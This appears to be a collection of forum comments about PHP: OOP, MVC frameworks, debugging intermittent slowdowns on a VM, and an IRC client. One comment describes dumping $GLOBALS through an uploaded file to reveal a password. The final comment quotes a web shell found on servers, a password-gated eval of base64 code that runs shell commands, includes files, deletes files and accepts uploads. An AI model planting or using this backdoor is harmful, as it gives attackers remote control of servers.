I think the thing that really made objects 'click' for me was using an array/linked list/collection of those objects. Then you can do cool stuff with them like sorting the array by whatever properties are inside the object. I'll do some rough code: class Box { public $length; public $width; public $height; public function __construct($length, $width, $height) { $this-&gt;length = $length; # mm $this-&gt;width = $width; # mm $this-&gt;height = $height; # mm } public function getVolume() { return ($this-&gt;length * $this-&gt;width * $this-&gt;height); } } // Create array of boxes with various dimensions $boxes[] = new Box(200, 105, 280); $boxes[] = new Box(100, 125, 270); $boxes[] = new Box(250, 125, 290); $boxes[] = new Box(150, 135, 250); // Output each box foreach ($boxes as $box) { echo 'L = ' .$box-&gt;length. ', H = ' .$box-&gt;height. ', W = ' .$box-&gt;width. ', Vol = ' .$box-&gt;getVolume(). '&lt;br&gt;'; } Then you could make some kind of [quicksort](https://secure.wikimedia.org/wikipedia/en/wiki/Quicksort), [insertion sort](https://secure.wikimedia.org/wikipedia/en/wiki/Insertion_sort), [bubble sort](https://secure.wikimedia.org/wikipedia/en/wiki/Bubble_sort) etc function and reorder the array by height, width, length or volume. I think PHP even has an inbuilt function you can use ([usort](http://de3.php.net/manual/en/function.usort.php)).
Yep, heard that more than once now about some projects. :)
MVC is simple when you look at it like this: Model = Grab the data Controller = Do stuff to the data View = Display the data On the other hand, OOP is just insane. You are like me and probably either did too many drugs in college, or not enough drugs to understand it.
I had the same experience with Ruby.
Really? Do you pronounce all of your acronyms and then judge others ignorant for not doing so?
Sigh. Neither CakePHP nor Kohana are in any serious sense MVC frameworks. Most PHP implementations of the MVC patterns are bastardizations of Rails, which is in itself a bastardization of MVC. MVC requires strict separation of concerns. Templates are *not* views, and ORM objects are *not* models.
Shhh! Don't lead him on with notions of hybrid patterns. :) (But I'm with you.)
huh, did not know that. Regardless, SQL is S. Q. L. if they wanted to name it sequel they should have figure it out some how. No one says Ibeam for IBM ;)
Concerning OOP: One of the simplest ways to get it is to model real-world objects (like, in another comment, an Animal). The thing is, the more you code, the more you find similar patterns in your own code. Let's take an example: A client asks you to create a page that simulates the behaviour of his latest phone. You'll end up with functions like: phoneInit() phoneDisplayScreen() phoneDialNumber() phoneContactAdd() phoneContactModify() phoneContactDelete() phoneShutdown() It gets messy pretty quickly. But anyway, you write the code for each function, you have a very long page of well-defined functions which simulate every detail of the phone's behaviour perfectly. Now imagine, one month later, the same client has released two new phones and wants your code to support those phones as well! You have several choices, but they will more likely be, either: * adding the phone id parameter in each of the functions, and adding test cases to execute different code, example: function phoneInit(phone_id) { switch($phone_id) { case 'phone_1': //do stuff break; case 'phone_2': //do stuff break; case 'phone_3': //do stuff break; } } and this, for each function, for each phone. Or: * duplicating the functions for each phone, example: phoneInit_phone1() phoneInit_phone2() phoneInit_phone3() In both choices, you end up by writing the same stuff 3 times, your code is long, very difficult to maintain (you find a bug, you have to fix it 3 times - and not forget it in one of the functions; Your client wants you to implement a new function, you have to implement it 3 times). I just wrote very basic functions. If you really want to simulate a phone you'll end up with thousands of functions. And hope that your client doesn't become more productive and add 10 new phones next month. **Now**, as I've said before, there are some similar patterns in this code. phone Init() phone DisplayScreen() phone DialNumber() phoneContact Add() phoneContact Modify() phoneContact Delete() phone Shutdown() So what you can do with OOP is to create classes, like this: class Phone { var contacts function init() function displayScreen() function dialNumber() function shutdown() } class PhoneContact { function create() function modify() function delete() } Now, you have short functions that have a simple and straightforward goal. The functions that are related are close to each other (you don't mix a function that modifies a contact and a function that display a screen). They're easy to find, modify and so on. You can init each phone with its characteristics and keep your other functions clean from duplicate, junk code, example: phone1 = new Phone("Galaxios", "blue", true); phone2 = new Phone("Asterios", "red", false); and all the functions stay the same, because you made them able to handle any kind of parameter, example: phone1-&gt;displayScreen(welcome_screen) phone2-&gt;contacts[2]-&gt;modify('name', 'Doe') I will stop there because I think you're already bored (if you have read anything at all)! Hope you get my point though.
Yes, problem?
U mad, bro?
URL Router fetches the URL and decides which controller it should pass the parameters to. One controller in CodeIgniter? You were doing it wrong.
Anyone know of a good/clear example of a MVC OOP PHP project they could download and analyze?
If we're to take a proper MVC definition from Smalltalk, or the more updated MVC2 or whatever bastardised definition, you're right, and a strict separation should be made. Too often current web MVC frameworks promote doing a lot of domain logic operations in the controller layer, rather than simply being responsible for taking a request and letting the model layer actually perform its functionality. These days when explaining I tend to explain it in terms of layers (it's not, but people tend to understand the separation better), or conceptual groupings of functionality. "Model" is the part of your application that is a modelling of real world stuff in software logic, or the so called 'business logic'. "View" is the part of your application tasked with displaying data to the user, and accepting input from the user. The "controller" is responsible for taking a user action and getting the information from the view to the model layer, often then triggering the view to be updated. The whole point is a separation of concerns, so that stuff to do with displaying data doesn't get tightly coupled to decisions about what to do with data, but still having these two concerns talking to each other. Instead of just saying they're *not* views, or *not* models, care to add your own explanation? 
PHP is a multi-paradigm programming language. You can use class based object model, straightforward procedural coding, and you can also do some functional programming with anonymous functions, and closures. And it's perfectly fine to mix and match the styles, even in same file. I tend to prefer procedural, and functional styles. But there are some problems that are easier (or cleaner) to implement with OOP-style. But most problems are better solved without OOP (my subjective opinion). OOP and stateless shared nothing approach that PHP uses is in particular problematic with OOP (i.e. you cannot have real singletons with PHP). It's fine not to understand OOP. But sometimes OOP has its uses.
Read up on Cross Site Request Forgery (CSRF). 
Ok here's my dumb question, why bother writing the Model rather than just getting the data directly from the database, and putting it back the same way?
Yes!
I fully understood MVC only after i created my own MVC framework. I used [this tutorial](http://anantgarg.com/2009/03/13/write-your-own-php-mvc-framework-part-1/).
The controller shouldn't be concerned with what kind of data storage is used. It could be a database, or a flat file, or a hybrid solution like sqlite. The model's job is to handle all that and give the controller a consistent interface. 
Sure. Classic MVC the way it was understood with respect to IO devices on which it was intended to operate can not be implemented over HTTP. A classic Model component was expected to be *active*; it could asynchronously change its internal state and inform the controllers or the views of the change. The nature of HTTP precludes this kind of operation, and the execution paradigm of PHP imposes additional limits. With HTTP, a single request yields exactly one response, and *no* response can be yield without a request. This coupling is permanently affixed into the transport protocol, so if you want to go around it, you have to do simulation both on the client and the server. Same goes for session context; it's a hack over the transport that's partly hidden and partly exposed, partly implemented in the transport, partly in the client and partly in the server, and fundamentally does not guarantee that the UI state of the client is accurate even if you track it on the server. It can't even guarantee that there's exactly one client within the same session. Basically, servers are blind, because clients are write-only. So, plainly speaking, implementing *merely* the MVC for Web does not give you the same guarantees of abstraction that it normally would. The mistake that Rails et al makes is that for the purposes of "rapid" development (remember all the "full blown blog in 20 seconds" FUD?), *application* components map exactly to MVC *pattern* components. Thus, in the Rails family, a model is a database object, oftentimes an ActiveRecord, views are passive templates and the rendering mechanism is hidden (which is why you all of a sudden have "helpers" that don't actually map to anything in MVC), and controllers are request handlers that implement half of the domain logic whereas the other half is either abstracted away by ORM library builtins or is implemented on the top of it. This shortsighted approach creates all sorts of interesting problems. For example, your application deals with Kittens, Puppies and Baskets. You need to be able to tell how many Kittens can be found in the Baskets that also contain Puppies. Does the respective method go into the Baskets class, Kittens, or Puppies? Is it an instance method or a class method, given how it *has* to be slapped over ActiveRecord? The correct answer to this question may not exist at all, yet Rails forces you to take a decision *and* uphold it throughout your codebase during the entire lifecycle of the project. This of course maintains the pretense of separation of concerns, but that'd fall apart the moment you have to introduce a completely new concern without rewriting the existing code - and that's exactly what MVC was expected to do. The correct way to implement MVC for web applications is to make the domain logic completely unconscious of the UI context it runs in. Models are not ORM instances; they are libraries of interfaces to your domain logic, and manipulation of data objects is completely hidden *inside*, ideally never leaking outside the models. If they are not, then several funny things can and will happen: * UI code somewhere may modify a leaked shared instance at runtime or even save it completely outside of what domain logic permits, dog help you debugging that, especially if there are transactions involved * UI code becomes dependent on the particular implementation of the ORM (e.g. tomorrow you replace library A with library B and all your templates are now broken because isFoo() became is_foo()) * The state of the returned instances is implied (template tries to loop over $Basket-&gt;Kittens to render $kitten-&gt;name and the implicit lazy join selects two dozen fields from the table because it doesn't know any better as well as any other joined tables) When you strip away controllers and views, what you get is a barebones native API to your application that accepts arguments and returns data in a known format that does *not* change if the underlying code or libraries are replaced. Although this may seem a minor point, it is very important, because the interface contract is between such native API and the consumer, *not* between the top level API methods themselves and certainly *not* between the API and the specific UI environment, transport protocols and so on. The controllers and the views are such consumers, but they also have contracts with the framework and effectively their purpose is to abstract between these two fundamentally different types of contracts. This allows you to express your UI logic in abstract fashion as well, being only as context-specific as necessary, because the framework knows to translate the requests from the outside world into the language the application can understand. Thus, controllers correspond to bindings between request handlers and models, implementing UI input logic. Views correspond to bindings between models and producing responses, thus implementing UI output logic. HTTP forces 1-&gt;1 relationship between controllers and views, so the return result of a controller **is a view**, the return result of the view is context-specific configuration for the rendering system or raw output. Around this entire scheme there's a larger framework context that begins with the dispatcher, performs request handling and routing, security, validation, etc. I've basically just described the architecture of the [Agavi](http://www.agavi.org) framework which I've been using in production for years and wrote much of its documentation. The practical result of this approach is identical to what MVC originally promised: write application and UI logic once. Add another interface (command line; serial protocol; WAP; RSS output; etc) to it and you don't have to rewrite anything, merely add specific code. Replace an inner component, and you don't have to break the UI. Too much? 
I didn't really understand OOP until [object-oriented nachos](http://books.google.com/books?id=-hMTzvUybLoC&amp;lpg=PA163&amp;ots=XmFtukvAqk&amp;dq=object%20oriented%20nachos&amp;pg=PA163#v=onepage&amp;q&amp;f=false). Then, I was laying in bed and it just "clicked".
Here's the why (and some what as well) 1. Encapsulation 2. Abstraction 3. Reusablility 4. Design Patterns
&gt; &gt; "Once upon a time, I cleaned up a nightmare in this general area for salary." &gt; Oh, that bodes well for me! Their problem was three-fold: 1) The original developer was an incompetent clown 2) The codebase was almost ten years old, and had been developed solely with English in mind (odd, given that the original developer's first language was not a European language) 3) The codebase was full of point-hacks to fix individual problems which were not documented or tested in any way; I basically had to reinvent ten years of coping with random mail servers because what had been done was not recoverable. If you start from day one with a large set of encodings in-place and tested, and if you choose a canonical internal encoding early (ostensibly some unicode notation,) you'll be fine. The problem itself isn't that hairy, if-and-only-if it's tackled the right way up front. Most of the suffering I went through was about the extant codebase, not the job.
[Sounds like you're on step 2](http://devthought.com/2009/02/24/the-four-stages-of-programming-competence/)
My point was more that a lot of times we web developers have a very narrow view of design patterns and often mistake (or at least portray) the MVC pattern as an inherent part of OOD. Which is to put the cart before the horse and doesn't make learning object-oriented design or programming any easier.
So that you don't have to rewrite the code every time you want the same functionality. A model should receive input from the controller, apply business logic, retrieve any data, and then output it(either to the controller or the view (depending on the framework). 
I was in the same boat as you for a long time, just doing, without understanding, then about 2 weeks ago I decided to use codeigniter to make a simple small brochure website with a admin area where they can change news. I followed the online codeigniter tutorials on net.tutsplus.com and somehow it did literally just "click" in my head. I mean, I'm no MVC or OOP expert or anything now, but I'm on my way! Hope this, if anything, gives you a bit of hope that it can be done!
MVC and OOP don't *have* to go together. All the major frameworks implement it that way, but it can be done procedurally/functionally as well. I love MVC because it let's my programming OCD take over and have a perfect place for each chunk of functionality, but I am not a fan of typical OOP. So I use static methods do do everything in my apps. Static classes let me keep similar functionality organized under one class name (ie DB::query($sql, $binds)...Validate::email($email)). You could also use namespaces, but w/ class autoloading, I never need to even reference a namespace before making calls, so I thought that was a better trade-off. You aren't a crazy person or bad developer just because OOP isn't your thing. MVC on the other hand I think is pretty neat, but really it's just about encouraging effective organization of your code IMO.
Pick up a framework like Zend and learn both at the same time http://framework.zend.com/manual/en/learning.quickstart.intro.html
&gt; You could also use namespaces, but w/ class autoloading, I never need to even reference a namespace before making calls, so I thought that was a better trade-off. I'm pretty sure you don't need to actually reference namespaces first. This works for example: \My\Namespace\StaticClass::doSomething();
Use a JQuery plugin.
OOP does not necessarily make you a good programmer. Plowing through any methodology gives you more tools in your tool belt which is great, and if OOP makes your life easier, then by all means go for it, but there are other ways. I find OOP inefficient, especially at data access if you really adhere to the encapsulation principle. Take a typical Contact record. Say it has basic info, (name, phone, email) and 2 addresses, Work and Home. You're going to be making 3 queries to get that data: SELECT * FROM contact WHERE contact_id = X; SELECT * FROM address WHERE contact_id = X AND type = 'home'; SELECT * FROM address WHERE contact_id = X AND type = 'work'; Can you make one query in the Contact constructor to lump these all into one result set and then instantiate the Addresses w/ that data? Sure you can, but now your addresses are reliant on the Contact class to build themselves out and aren't really little islands of functionality all on their own anymore.
Best post in the entire thread. 
I need a "favourites" button just for this post. Superb, and in common sense English!
There has been some downsides from coding in Python vs. PHP. A lot of my code now tends to be more "Pythonic" and borrow a lot of concepts from Python. I've had issues with co-workers not understanding what my code does. When I've used things like Duck Typing I get the "What the fuck is Duck Typing?" Plus it didn't help that I was using some more of the complex design patterns such as visitor and strategy. But, then again I also find myself beating them with a stick for using older style PHP practices such as unix timestamps for dates vs. datetime objects which have been around since PHP 5.2 and got better in 5.3. I'd also like to point out some of the new changes to JavaScript that have been influenced by concepts from other languages. [http://gumuz.nl/weblog/pythonic-javascript-its-python-braces/](http://gumuz.nl/weblog/pythonic-javascript-its-python-braces/)
there is a bug with your template.php file... when you're referencing title="$site_title" - view source on your demo and you'll see what i'm talking about. Find: &lt;?= anchor('/', $site_title, 'title="$site_title"')?&gt; And Replace with: &lt;?= anchor('/', $site_title, 'title="'.$site_title.'"')?&gt; 
You can browse my codeigniter code (it's little bit messy) if You are searching for more examples: https://github.com/jmalinens/wap4
Ah great didn't spot that! Thanks!
This thread needs more car analogies.
You can barely call C++ an object-oriented language. * Private members are implicitly part of the interface for a class; changing private members of a class trigger a recompile of caller code. * The type system is insane. * C++ doesn't have encapsulation. See the first point; no compile-time encapsulation, and no run-time encapsulation (you can overwrite private memory from another class at runtime). * There's no reflection. 
Most of my MVC framework experience is with Django, which is termed a MVT (model, view, template) framework. I'll cede this point, as there are multiple controllers in a straight MVC implementation.
And the power of this is you can adjust your datastore as necessary to meet the needs of your application without having to rewrite any other part of your application. Most MVC frameworks have an ORM (Object-relational Manger) component, which takes care of the low-level DB-stuff. So you can change your DB solution (sqlite, flat, postgre) and you wouldn't even have to rewrite any of your models.
Fear the automagic!
You mean like Post-Gres-Kwul?
It's right.
&gt; I do pretty well with it and have had no trouble making it do anything I need it to. heh, i've known developers who said this, then i see their spaghetti code. &gt; Here's the why (and some what as well) 1. Encapsulation 2. Abstraction 3. Reusablility 4. Design Patterns
Thank you so much for uploading this code. I've been studying CI recently so going through your project is a great exercise for me. Could you possibly provide those example posts you made as a data table that I could import? I've tried making a few test posts myself but I'm unsure what all the fields are for. For instance, I'm currently trying to figure out what "qr" means and what to put in the "views" column. If I could use your data, it would be a big help. 
Ever heard of [CakePHP](http://cakephp.org/)? It was my first introduction to MVC and I've been loving it for years now.
No problem! I've uploaded a dump of the sites db here: http://blog.laurencedawson.com/example.sql I'm yet to document the sql, on the list of things to do! Views is how many times the post has been viewed and QR is a link to QR code of the short url, both are currently not used but I've payed around with them.
Fantastic post, I'll refer people to this whenever I see someone trying to understand what MVC is, especially from the "what's the point?" view. I think the key part of your post that I can't highlight enough is &gt; Models are not ORM instances; they are libraries of interfaces to your domain logic, and manipulation of data objects is completely hidden inside, ideally never leaking outside the models This is one of the strong points of Grails where they encourage the separation of all domain logic off into spring managed services, leaving the controller purely as an interface between IO and data. 
We love CakePHP, a lot of easy ways to do: emails formats, Ajax, RSS, downloads, ACL, REST, security and a lot of flexibility. http://trac.chipotle-software.com/karamelo/browser/trunk/app Every new version is faster and smoother. 
We love CakePHP, a lot of easy ways to do: pagination, emails formats, Ajax, RSS, downloads, ACL, REST, security and a lot of flexibility. http://trac.chipotle-software.com/karamelo/browser/trunk/app Every new version is faster and smoother.
I learned PHP using MVC and OOP in a week, so it's really easy for me to understand. Compare MVC to how you interact with an XBox360. Compare OOP to an outline you'd have to write for a huge essay. Each topic would represent a class with its respective private and protected functions &amp; properties. I shouldn't have to explain the public functions &amp; properties aspect ;) Edit: clarity
I would like to expand on one more benefit. By using a model you can set and change rules. One example is validations, such as validating any Data going into the model is within a certain range for example. If you wanted to change that range and were accessing the data directly then you would have to alter all your direct access layers, whereas if you change it on the model you only do it in one spot and it is validated everywhere. Also many frameworks have built in validations for security, and like others said it allows you to change your base database system with minimal code changes, which happens in the real world. 
&lt;nazi class="grammar"&gt;It's [per se](http://en.wikipedia.org/wiki/Per_se).&lt;/nazi&gt;
It sounds like you should have the source of the problematic code now, no? Are you using disk-based sessions by any chance? 
Can we see the code?
Have you tried using strace? I think [this video](http://www.youtube.com/watch?v=eF-p--AH37E) will help you understand how you can troubleshoot it with strace.
The code executes fine. In the profiler output we will occasionally see a time gap of a few seconds but they happen at different places. Sometimes it will happen in an interation of a loop where previous interations executed in microseconds. It seems like there is something happening at the end of the request that is preventing the output from being sent to the browser. It's like PHP is waiting on something but a vmstat shows mostly idle processes and plenty of IO. We are storing sessions in the DB using PHP's session_set_save_handler function.
I can show you the profiler code if you think it'll help, but the problem isn't localized to a certain line or file, or even a certain request.
Thanks, watching now. It's difficult to use stuff like this cause it doesn't happen consistently.
Ahh. I see. It wouldn't hurt to see it. So I understand, you're saying that regardless of the object, there is a 30 second pause before the destructor is called after script execution?
Yes, exactly, but it only happens maybe once every hour or so. There's no consistent pattern in either the time of occurance, or in the amount of time it hangs.
Does it happen on all kinds of requests, meaning, does it have an equal chance of happening on any computer, or just certain ones you are testing? That said, have you eliminated any possible network issues? Aside from that, what i would do, is strip out patches of code and keep running your profiler. Start at the end obviously, and run it without that patch for a while, see if you get the same issues. Eventually, you may run into enough removed code that you don't see the delay, and you narrow down the culprit that way. Is the delay infrequent in both the frequency of occurrences and the length of the delays? Determining that may lead you to a possible area of interest as well.
Does the same thing happen on a different server? I can't imagine it's your code causing that. It feels like it would be database usage or file system read/writes. How are your log files? Does the site have high traffic or is there a script that does heavy processing elsewhere?
What else is running on the box? Periodic problems like that I see are generally due to a CPU intensive cron job, or another app doing something wrong. Network issues connecting to the db server could also cause problems. I'd start by trying to set up something like munin and look at graphs of CPU load, memory usage and network throughput to see if you can determine what is causing problems during the occasional stumble. 
&gt; session_set_save_handler Problem with your write or garbage collection queries? Check your mysql error logs. Be sure to set your db config to log slow queries, and check that. Also profile all your queries to make sure they run smoothly within the db environment itself. 
My guess is a sql table lock from another script that is preventing the current script from accessing the data it needs.
Tried xdebug?
The ticks will only fire in PHP code, but if the code is waiting on a long database request (for example), you won't get any ticks. I suspect that you problem is not in the PHP code but rather some resource (disk, database) that you are using. You could also try an actual profiler, like xdebug, for more fine-grained information. 
Completely off the point of OP's question, but related to MVC. Just in case any Apache users didn't know yet, Apache came out with the [FallbackResource](http://httpd.apache.org/docs/trunk/mod/mod_dir.html#fallbackresource) directive a version or so ago (maybe 2.2.16) so you don't have to deal with the whole `Rewrite` mess. Now back to your regularly scheduled program.
Did you figure this out? It seemed to me like you needed a While($row = $stmt-&gt;fetch()) and a few $row[] references but I could just be drunk.
\# is sharp in music theory
Just keep in mind that the VM may virtualize away performance bottlenecks on the host machine so that your profiling or monitoring within the VM wouldn't show. e.g. if the host machine's other VMs are hitting the disks hard, your VM's vmstat/zabbix/munin/sysstat wouldn't show anything abnormal. Disk I/O for virtualized environments can fluctuate wildly, just ask reddit/amazon EBS.
You should run a disk check on your server (also check smart).
I've recently dealt with a client who had exactly these sort of issues. Turned out to be caused by the database. A few pages contained queries that would run very slowly - whenever these were processing any other queries would have to wait, sometimes up to a minute. The effect of all other queries having to wait meant that all pages were effected, not just the pages containing the slow queries. Try setting up a slow query log and seeing if you have any queries taking unusually long times. Edit: Link to the [mysql slow query log docs](http://dev.mysql.com/doc/refman/5.1/en/slow-query-log.html) 
I've recently run into the exact same situation, though mine is consistently dog slow on the vm but runs fine on even older physical boxes. Mine is definitely tied to a problem with the vm, resource starvation best I can come up with from sar output...might try it on physical hardware and see of it still happens.
Also, OOP is a great way to really visualize how to implement proper encapsulation.
but xdebug actually causes me the same issues as OP if you're not careful with the dump settings and without the profiler/debugger code even being enabled.
i dunno why but I just lol'd
I also suspect that the VM might be hiding the root problem or even causing the problem. At work we tried Amazon's cloud services and concluded that they performed really poorly and disk I/O was particularly terrible. We're now on Rackspace and if we need to scale quickly we can spin up a few instance on the Rackspace cloud that work seamlessly with our dedicated servers.
I will say from 10+ years experience with PHP that yes you can make wonderful and amazing sites without OOP or Frameworks. However, having LEARNED how to use OOP and creating my own framework, I will NEVER go back to not using them. On the topic of OOP: Even when I try not to use it, I use it. Lots of people will say objects are slow, I think they mean it requires forward thinking and pre-planning, something a lot of programmers are bad at. Extending your first base class (and it may take time for this to click) will seriously change how you think about programming. This will also help you in languages that are completely OOP like Javascript and C#. On the topic of Frameworks: Frameworks are designed to make life easier by making difficult tasks simple to implement. It makes since that if a bunch of people feel xyz is a better way to do abc, then perhaps it's worth taking the advice and avoiding a common pitfall. The issue here is finding a good framework. I would recommend looking at some of the ones out there, but making your own is also a good option. You will find yourself writing the code once and reusing it. OOP makes this super easy because you make an object that does something well and the moment it needs to do something slightly different you extend it to a new class that only overrides that one method or property! To me it sounds like the guy you're working with is just set in his ways. I would tell him that C and ASM aren't web languages and he's comparing apples to rocket ships.
Which version of PHP are you running and what OS are you running on the VM? Also what virtualization software are you running?
Yeah, and in this case there is no way to stop it. They can simply look for it by tracing back the includes. Secondly, if they don't have access to the files directly but can somehow upload one.. they could require('index.php') and maybe echo "&lt;pre&gt;"; print_r($GLOBALS); echo "&lt;/pre&gt;"; to dump the password out... this might also work if you ever passed a form input variable directly into eval for some bad reason...
If your code is running fine a majority of the time, it's most likely an issue with resources on the VM. I've run into issues like this plenty of times. For instance, if you use Amazon's micro instance, their CPU throttling is extremely harsh. If another process starts taking up too much CPU, your CPU will hit 100% steal time for a period of time and your site will become completely unresponsive. Another issue could be the disk. Run `iostat -x 2` and watch the iowait values. Anything beyond a couple percentage points is too high. High iowait usually means you're out of RAM and your machine is swapping to disk. Waiting on disk causes your processes to halt until the disk is ready.
Thanks a lot! Now it's much more professional looking with the JQuery lightbox plugin.
One last question: I have implemented all of the suggestions you guys have provided. I structured the search.php so that it returns each professor as a hyperlink redirecting to professors.php?id=$ID . How would I go about constructing the pages for every professor? Surely I could create a dynamic php page that basically lays out the structure of the page and it is loaded by reference to the database. For example, I would include a picture, a short biography with achievements, and finally the rating system. Do you have any suggestions for this? I'm assuming that, for my new goals, I would have to store images in the database, or at least the name of the image associated with each professor. Thanks all! 
Use [$_SERVER['DOCUMENT_ROOT']](http://php.net/manual/en/reserved.variables.server.php)
that'll give me public_html or htdocs, but it wont tell me how to get from there to my application. i found what i needed, http://httpd.apache.org/docs/2.2/en/vhosts/ i just need to find a guide or something on how to configure it.
I know it is definitely not elegant, but it works: if (strlen(strstr($Server,'localhost'))&gt;0 || strlen(strstr($Server,'127.0.0.1')&gt;0 )) { //development $base='http://localhost/project1/'; } else //production $base='/'; every link should have at the beginning the $base. 
In Apache, you can setup virtual servers, but the easiest, most flexible, and most convenient way, in my opinion, is to keep a file that contains global constants or a configuration array of key-value pairs. Some PHP projects use this method because it is portable. I also usually set a debug option as a boolean, so I can switch between a live and test environment when deploying by toggling that value. Essentially it just switches the path/url/domain I have set in the configuration file between two possible values. Ex: if(DEBUG) define('DOCROOT', $_SERVER['DOCUMENT_ROOT'].'directory/'); else define('DOCROOT', $_SERVER['DOCUMENT_ROOT']); I then use this when I need to reference files via a filesystem location.
well im trying virtual hosts right now, but it's kind of a pain in the butt and isn't working properly. so i might just switch to the other system. i already have a config file setup with constants, so i'd only have to add a couple more. plus i could switch between database configurations fairly easily with this system
Have you looked ad mod_rewrite and RewriteBase? http://httpd.apache.org/docs/2.0/mod/mod_rewrite.html It might just be what you're looking for.
There are several ways, this is one: In you htdocs/project1/ folder create a file, lets call it root.php //root.php &lt;?php define( 'ROOT_DIR', dirname(__FILE__) ); ?&gt; Include it on every file, then include your files like this: include (ROOT_DIR.DIRECTORY_SEPARATOR.'includes'.DIRECTORY_SEPARATOR.'filename.php') edit:just realized I'm not replying to your new question, nvm 
I had to create my own permissions system on cake. It was far easier than understanding it and implementing ACL. Also, I had a deadline.
A vhost is only for rows
you came to help :) i appreciate that but i ended p doing what both you and farcrymishap suggested, which seems to work perfectly well and has the added bonus of allowing me to switch db configurations too (if i do his extra suggestion) so thanks to both of you :)
[It's a piece of cake!](http://www.webdevelopment2.com/cakephp-bake-baking-models-controllers-views-cakephp-12/).
&gt; strlen(strstr($Server,'localhost'))&gt;0 strpos is faster than strstr. Just check whether or not the result === false.
You can use the dirname(`__FILE__`) or `__DIR__`(PHP 5.3) to get the absolute path to the directory of the current file. Based on that you can set a constant called ROOT or whatever to the directory. If the file you set the constants in are not the directory you want to specify you can throw some more dirname() on it. Example: / &lt;- Project root /lib &lt;- Code goes here /lib/bootstrap.php is the one that sets the ROOT constant. In bootstrap.php use `define('ROOT', dirname(dirname(__FILE__)));` Edit: Escaped Markdown like abackstrom did
lol at apples != rocket ships. And yeah...I think the one big issue with me and frameworks was trying ZF as my first one...just configuring it is such a pain in the rear!, and everything has a standard that you've got to learn,...which is cool,...but not what you expect of your first framework experience, it really discouraged me. I'm currently playing with CI and I can't believe how easy it is!
10x for the tip.
If a web host is shitty enough to lack PDO, it will probably lack mysqli as well. Then the only solution is to find a better host.
Unfortunately this won't work with FastCGI (I think, I may be wrong) or if you decide to have a CLI-wrapper to your site (e.g. for use with cron)
If you use a database abstraction layer or something even more advanced like Doctrine or Zend_Db, then they'll handle escaping for you.
I always get errors and it never works. 
The default settings are fine unless you're on a seriously underpowered box. Otherwise, you probably turned every knob to _11_, which isn't good. You should only be turning one knob at a time to _11_.
Awww I was just thinking about a really cool article I read in 2600 about this. I'd cite the article but I suck and can't find it.
I wrote this function b($b){$l=strlen($b);while($i&lt;$l){$c+=(base_convert($b[$i],36,10)-9)*pow(26,$l-1-$i);$i++;}return $c;} It calculated the numeric column name of an excel column name. I wrote it after viewing the [stack overflow code golf thread](http://stackoverflow.com/questions/2634427/code-golf-numeric-equivalent-of-an-excel-column-name). 
also from the s.o. code golf thread is this: $n=$argv[1];$s=$i=0;while($i&lt;strlen($n))$s=$s*26+ord($n[$i++])-64;echo$s; 
Unfortunately, using PHP is just the wrong approach. Not because of its poor performance, but because of the way PHP actually works: it is script-based and every request triggers the execution of the request-specific php script. Let me explain: As long as you are not using websockets or similar every user input will trigger the execution of a php script. You will find it extremely hard - if not impossible - to maintain a second php script or thread running and listening on the socket you create to communicate with the irc server. The only way I can currently think of is the following: Your UI will have two frames, one loading a php script which is listening on the socket connected to the irc server. As soon as it receives data, the parsed data will be echoed to browser. Make sure you don't have output-buffering enabled. If you can't keep the script loading (e.g. because of maximum execution time), you will have to use javascript to reload the frame. This on the other side would have your script to socket-connect to the irc server every time the frame gets refreshed. The other frame is populated by an input object where the user types his commands. Every time the input is sent of, the script behind that frame would have to save the user input into a temporary file/database to allow your first script to read the data from a temporary file/database etc. and send it over the socket connection.
Yeah. That's what I figured. I know it's the "wrong" approach, and I'm well aware that my particular implementation (client as opposed to a bot) is what causes the issue. Hmm. I really don't want to use Java for this (there are already Java IRC clients out there anyways), but it sure seems like PHP just won't work. Oh well, at least I learned a little about IRC protocols. I find your temporary file idea interesting, but that seems a bit clunky to me (and it's probably the only way to do it). Certainly not an elegant solution. Oh well, thanks for the suggestion!
Some of the PHP backdoors we find on servers in the wild are pretty impressive. example. if(isset($_GET['passwd']) &amp;&amp; $_GET['passwd'] == 1992871) { eval(base64_decode('aWYoaXNzZXQoJF9HRVRbJ3N5c3RlbSddKSl7IGVjaG8gIjx0ZXh0YXJlYSBjb2xzPVwiMTAwXCIgcm93cz1cIjgwXCIgcmVhZG9ubHk+XG4iOyBzeXN0ZW0oJF9HRVRbJ3N5c3RlbSddKTsgZWNobyAiPC90ZXh0YXJlYT4iOyBkaWUoKTt9DQppZihpc3NldCgkX0dFVFsnaW5jJ10pKXsgaW5jbHVkZSgkX0dFVFsnaW5jJ10pOyBkaWUoKTt9DQppZihpc3NldCgkX0dFVFsnYWN0J10pKXsgaW5jbHVkZSgnL3RtcC8uX2NvbmZpZy5iYWsnKTt9DQppZihpc3NldCgkX0dFVFsnZGVsJ10pKXsNCiRmaWxlbmFtZSA9ICRfR0VUWydkZWwnXTsNCmlmKCAkZmlsZW5hbWUgPT0gIiIgKSANCnsNCiAgZWNobyAiRVJST1I6IHBhdGgvZmlsZW5hbWUgTk9UIFNQRUNJRklFRC4iOyBkaWUoKTsNCn0gZWxzZWlmICggISBmaWxlX2V4aXN0cyggJGZpbGVuYW1lICkgKSANCnsNCiAgZWNobyAiRVJST1I6ICRmaWxlbmFtZSBub3QgZm91bmQuIjsgZGllKCk7DQp9IGVsc2Ugew0KZWNobyAiREVMRVRJTkc6ICRmaWxlbmFtZSI7DQp1bmxpbmsoJGZpbGVuYW1lKTsgZGllKCk7DQp9DQp9DQppZihpc3NldCgkX1JFUVVFU1RbJ3VwJ10pKXsNCiRmaWxlbmFtZSA9ICRfR0VUWyd1cCddOw0KaWYoICRmaWxlbmFtZSA9PSAiIiApIHsgZWNobyAiRVJST1I6IHVwbG9hZCBwYXRoL2ZpbGVuYW1lIE5PVCBTUEVDSUZJRUQuIjsgZGllKCk7fQ0KZWxzZSB7DQplY2hvICI8Rk9STSBFTkNUWVBFPVwibXVsdGlwYXJ0L2Zvcm0tZGF0YVwiIE1FVEhPRD1cIlBPU1RcIj5cbiI7DQplY2hvICI8SU5QVVQgVFlQRT1cImhpZGRlblwiIG5hbWU9XCJNQVhfRklMRV9TSVpFXCIgdmFsdWU9XCI1MDAwMDBcIj5cbiI7DQplY2hvICJVcGxvYWQgJGZpbGVuYW1lIDpcbiI7DQplY2hvICI8SU5QVVQgTkFNRT1cInVzZXJmaWxlXCIgVFlQRT1cImZpbGVcIj5cbiI7DQplY2hvICI8SU5QVVQgVFlQRT1ISURERU4gTkFNRT1cIlhcIiBWQUxVRT0xPlxuIjsNCmVjaG8gIjxJTlBVVCBUWVBFPVwic3VibWl0XCIgVkFMVUU9XCJTZW5kXCI+XG4iOw0K